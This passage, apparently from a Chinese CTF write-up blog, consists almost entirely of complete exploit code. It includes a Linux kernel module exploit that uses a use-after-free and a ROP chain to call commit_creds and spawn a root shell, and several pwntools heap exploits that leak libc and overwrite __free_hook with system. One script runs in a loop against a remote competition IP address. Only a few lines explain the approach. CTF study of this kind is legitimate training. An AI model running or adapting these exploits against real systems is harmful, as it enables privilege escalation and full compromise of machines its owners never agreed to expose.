class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0xf8</span> + p64(free_hook)<br>send_command(<span class="hljs-string">b&#x27;gedit flag4&#x27;</span>)<br>p.sendline(payload)<br><br>send_command(<span class="hljs-string">b&#x27;touch flag5&#x27;</span>)<br>p.sendline(p64(sys_addr))<br>send_command(<span class="hljs-string">b&#x27;rm flag1&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="kheap"><a href="#kheap" class="headerlink" title="kheap"></a>kheap</h1><p>攻击思路：</p><ol><li>使用0x10002这个选项时直接复制堆地址，释放堆块后select中存了堆地址，造成uaf。</li><li>使用seq_file，其正好会使用0x20大小的堆块，直接read就可以泄漏内核地址。</li><li>write修改seq_operations的内容，并给相应的寄存器复制构造ROP，最后调用read的系统调用。</li></ol><p>完整exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810ce710</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred = <span class="hljs-number">0xffffffff810cebf0</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82c6b920</span>;<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81c00fb0</span>;<br><br><span class="hljs-type">size_t</span> add_rsp_0x1a8_ret = <span class="hljs-number">0xffffffff817d1e76</span>;<br><span class="hljs-type">size_t</span> pop_rdi_ret = <span class="hljs-number">0xffffffff8102517a</span>;<br><span class="hljs-type">size_t</span> kernel_offset;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-type">int</span> kheap_fd, seq_fd;<br><span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x10</span>];<br><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Status has been saved. \n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Process binded to core %d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_shell</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed to get the root!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">a</span>;</span><br>    a.idx = idx;<br>    ioctl(kheap_fd, <span class="hljs-number">0x10000</span>, &amp;a);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">a</span>;</span><br>    a.idx = idx;<br>    ioctl(kheap_fd, <span class="hljs-number">0x10001</span>, &amp;a);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mov</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">a</span>;</span><br>    a.idx = idx;<br>    ioctl(kheap_fd, <span class="hljs-number">0x10002</span>, &amp;a);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gift</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx , <span class="hljs-type">void</span> *buf)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">a</span> =</span> &#123;idx, buf&#125;;<br>    ioctl(kheap_fd, <span class="hljs-number">0x6666</span>, &amp;a);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    save_status();<br>    bind_core(<span class="hljs-number">0</span>);<br>    <br>    kheap_fd = open(<span class="hljs-string">&quot;/dev/kheap&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(kheap_fd &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to open!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    add(<span class="hljs-number">0</span>);<br>    mov(<span class="hljs-number">0</span>);<br>    del(<span class="hljs-number">0</span>);<br><br>    seq_fd = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(seq_fd &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to open!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    read(kheap_fd, buf, <span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_addr_is 0x%lx\n&quot;</span>, buf[<span class="hljs-number">0</span>]);<br>    kernel_offset = buf[<span class="hljs-number">0</span>] - <span class="hljs-number">0xffffffff8133f980</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_offset_is 0x%lx\n&quot;</span>, kernel_offset);<br>    buf[<span class="hljs-number">0</span>] = add_rsp_0x1a8_ret + kernel_offset;<br>    <br>    write(kheap_fd, buf, <span class="hljs-number">8</span>);<br><br>    pop_rdi_ret += kernel_offset;<br>    init_cred += kernel_offset;<br>    commit_creds += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode = swapgs_restore_regs_and_return_to_usermode + <span class="hljs-number">10</span> + kernel_offset;<br><br>    __asm__(<br>    <span class="hljs-string">&quot;mov r15,  0;&quot;</span><br>    <span class="hljs-string">&quot;mov r14,  0;&quot;</span><br>    <span class="hljs-string">&quot;mov r13,  pop_rdi_ret;&quot;</span><br>    <span class="hljs-string">&quot;mov r12,  init_cred;&quot;</span><br>    <span class="hljs-string">&quot;mov rbp,  commit_creds;&quot;</span><br>    <span class="hljs-string">&quot;mov rbx,  swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>    <span class="hljs-string">&quot;xor rax,  rax;&quot;</span><br>    <span class="hljs-string">&quot;mov rdx,  8;&quot;</span><br>    <span class="hljs-string">&quot;mov rsi,  rsp;&quot;</span><br>    <span class="hljs-string">&quot;mov rdi,  seq_fd;&quot;</span><br>    <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ttsc"><a href="#ttsc" class="headerlink" title="ttsc"></a>ttsc</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ttsc&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./ttsc&#x27;)</span><br><span class="hljs-keyword">global</span> p<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;chs:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;chs:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;chs:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;name?&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;age?&#x27;</span>, <span class="hljs-string">b&#x27;111&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;high?&#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x31</span>))<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">2</span>)<br><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, <span class="hljs-number">8</span>):<br>        add(<span class="hljs-number">0</span>, i * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>        add(<span class="hljs-number">1</span>, i * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>        add(<span class="hljs-number">2</span>, i * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>        add(<span class="hljs-number">3</span>, i * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>        delete(<span class="hljs-number">3</span>)<br>        delete(<span class="hljs-number">2</span>)<br>        delete(<span class="hljs-number">1</span>)<br>        delete(<span class="hljs-number">0</span>)<br><br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + <span class="hljs-string">b&#x27;\x51&#x27;</span><br>    edit(<span class="hljs-number">1</span>, payload)<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br><br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">b&#x27;\xf0&#x27;</span> <br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>, payload)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x20</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4c1</span>))<br><br>    delete(<span class="hljs-number">1</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">2</span>)<br><br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;\x60&#x27;</span> + <span class="hljs-string">b&#x27;\x57&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x50</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1150</span><br>    libc_base = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br><br>    delete(<span class="hljs-number">0</span>)<br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x31</span>) + p64(free_hook)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>, payload)<br>    delete(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x20</span>, p64(sys_addr))<br>    delete(<span class="hljs-number">0</span>)<br>    p.interactive()<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./ttsc&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>, <span class="hljs-number">20111</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><h1 id="three-edit"><a href="#three-edit" class="headerlink" title="three_edit"></a>three_edit</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn4&#x27;</span>)<br><span class="hljs-comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span><br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./pwn4&#x27;, aslr=False)</span><br><span class="hljs-keyword">global</span> p<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x50</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0x61</span>))<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    delete(<span class="hljs-number">2</span>)<br>    delete(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>        add(i, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    delete(<span class="hljs-number">4</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">2</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    edit(-<span class="hljs-number">62</span>, <span class="hljs-string">b&#x27;\x40&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x50</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x461</span>))<br>    delete(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br>    <br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br>    edit(-<span class="hljs-number">60</span>, <span class="hljs-string">b&#x27;\xa0&#x27;</span> + <span class="hljs-string">b&#x27;\x86&#x27;</span>)<br>    add(<span class="hljs-number">4</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    edit(-<span class="hljs-number">60</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-comment">#p.recvuntil(b&#x27;\x7f&#x27;, timeout=1)</span><br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) + <span class="hljs-number">0xd20</span><br>    libc_base = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    free_hook = libc_base + libc.sym[<span 